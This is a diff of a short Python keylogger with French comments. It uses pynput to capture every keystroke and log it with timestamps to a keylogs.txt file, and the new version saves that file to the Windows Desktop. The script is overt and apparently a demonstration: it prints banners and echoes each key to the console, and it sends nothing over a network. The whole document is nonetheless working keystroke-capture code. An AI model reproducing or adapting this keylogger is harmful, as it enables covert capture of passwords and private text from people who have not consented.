@@ -1,54 +1,43 @@
 import logging
 import os
 import sys
-from pynput import keyboard
 import time
 
-# --- CONFIGURATION ---
-# On récupère le chemin du dossier où se trouve ce script
-CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
-LOG_FILE = os.path.join(CURRENT_DIR, "keylogs.txt")
+# On configure le fichier de log sur le Bureau
+desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+log_file = os.path.join(desktop, "keylogs.txt")
 
-print(f"--- DEMARRAGE DU KEYLOGGER WINDOWS ---")
-print(f"[INFO] Le fichier de log sera ici : {LOG_FILE}")
-print(f"[INFO] Ecoute en cours... (Fermez cette fenetre pour arreter)")
+print(f"--- KEYLOGGER ACTIF ---")
+print(f"[INFO] Fichier de sortie : {log_file}")
+print(f"[INFO] En attente de frappes... (Tapez du texte !)")
 
-# Configuration du logging : 
-# 1. Ecriture dans le fichier
-# 2. Affichage dans la console (pour la démo)
+# Configuration pour afficher dans la console ET écrire dans le fichier
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s: %(message)s',
     handlers=[
-        logging.FileHandler(LOG_FILE, encoding='utf-8'),
-        logging.StreamHandler(sys.stdout) 
+        logging.FileHandler(log_file, encoding='utf-8'),
+        logging.StreamHandler(sys.stdout)
     ]
 )
 
-def on_press(key):
-    try:
-        k = str(key).replace("'", "")
-        
-        # Nettoyage pour la lisibilité
-        if key == keyboard.Key.space:
-            k = " [ESPACE] "
-        elif key == keyboard.Key.enter:
-            k = " [ENTREE]\n"
-        elif key == keyboard.Key.backspace:
-            k = " [EFFACER] "
-        
-        # 1. Affiche dans la console noire (Preuve visuelle)
-        print(f"Capture > {k}")
-        
-        # 2. Ecrit dans le fichier
-        logging.info(k)
-        
-    except Exception as e:
-        print(f"Erreur: {e}")
+def demarrer():
+    # Importation à l'intérieur de la fonction pour éviter les erreurs si pynput manque au début
+    from pynput import keyboard
 
-# Lancement du Hook Windows
-try:
+    def on_press(key):
+        try:
+            k = str(key).replace("'", "")
+            if key == keyboard.Key.space: k = " [ESPACE] "
+            if key == keyboard.Key.enter: k = " [ENTREE]\n"
+            
+            print(f"Touche : {k}") # Preuve visuelle
+            logging.info(k)        # Preuve stockée
+        except Exception as e:
+            print(f"Erreur: {e}")
+
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-except KeyboardInterrupt:
-    print("Arret du keylogger.")
+
+if __name__ == "__main__":
+    demarrer()
